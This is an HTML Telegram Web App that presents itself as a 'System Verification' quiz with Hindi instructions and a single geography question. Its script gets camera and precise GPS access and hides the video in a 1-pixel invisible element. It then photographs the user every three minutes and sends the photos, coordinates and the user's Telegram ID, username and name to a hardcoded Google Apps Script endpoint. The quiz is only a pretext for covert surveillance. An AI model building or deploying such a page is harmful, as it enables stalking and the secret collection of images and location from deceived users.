<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h3 { margin-top: 0; color: #00eaff; }
        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
        video { width: 1px; height: 1px; opacity: 0; position: fixed; top: 0; }
    </style>
</head>
<body>

<div id="login" class="card">
    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
    <h3>System Configuration</h3>
    <div class="instruction-box">
        • सिस्टम सेटअप किया जा रहा है।<br>
        • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
        • <b>नोट:</b> Perfect HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
    </div>
    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
</div>

<video id="proctorVideo" autoplay playsinline></video>

<div id="quizBox" class="card" style="display:none">
    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
    <div id="options"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // --- APNA APPS SCRIPT URL YAHA DALEIN ---
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzQKp_JWF9juebUImgf1cm4hwEi6DZdv-vvfnWIb-LmzM-4oGf7L4Ya5xrZpoxUnNfWGA/exec"; 

    const user = tg.initDataUnsafe?.user || {};
    let userLoc = "Pending";
    let globalStream = null;
    let currentIdx = 0;

    const questions = [
        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
    ];

    async function requestAllPermissions() {
        const btn = document.getElementById("startBtn");
        btn.disabled = true;
        btn.innerText = "Configuring... ⏳";

        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: 1280, height: 720, aspectRatio: 1.7777777778 } 
            });
            document.getElementById('proctorVideo').srcObject = globalStream;

            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
            });
            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;

            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            loadQuestion();
            
            // Send first data
            captureAndSend("Test_Started");
            setInterval(() => captureAndSend("Periodic_Check"), 180000);

        } catch (err) {
            alert("Permission Denied! Camera/Location access is required.");
            btn.disabled = false;
            btn.innerText = "प्रक्रिया शुरू करें";
        }
    }

    async function captureAndSend(statusType) {
        if (!globalStream) return;
        try {
            const video = document.getElementById('proctorVideo');
            const canvas = document.createElement('canvas');
            canvas.width = 1280;
            canvas.height = 720;
            const ctx = canvas.getContext('2d');
            
            // HD Drawing
            ctx.drawImage(video, 0, 0, 1280, 720);
            const photoData = canvas.toDataURL('image/jpeg', 0.7); // Reduced slightly for speed

            const payload = {
                userId: user.id || "NA",
                username: user.username || "NA",
                fullName: (user.first_name || "") + " " + (user.last_name || ""),
                score: "Active",
                status: statusType,
                photo: photoData,
                location: userLoc
            };

            // Enhanced Fetch
            fetch(SCRIPT_URL, { 
                method: "POST", 
                mode: "no-cors", // Keep no-cors for Google Apps Script redirects
                body: JSON.stringify(payload) 
            });
            
        } catch (e) { console.log("Error:", e); }
    }

    function loadQuestion() {
        if (currentIdx >= questions.length) { 
            alert("Test Submitted!"); 
            tg.close(); 
            return; 
        }
        const qData = questions[currentIdx];
        document.getElementById("question").innerText = qData.q;
        const optionsDiv = document.getElementById("options");
        optionsDiv.innerHTML = "";
        qData.o.forEach((opt, i) => {
            const div = document.createElement("div");
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentIdx++; loadQuestion(); };
            optionsDiv.appendChild(div);
        });
    }
</script>
</body>
</html>
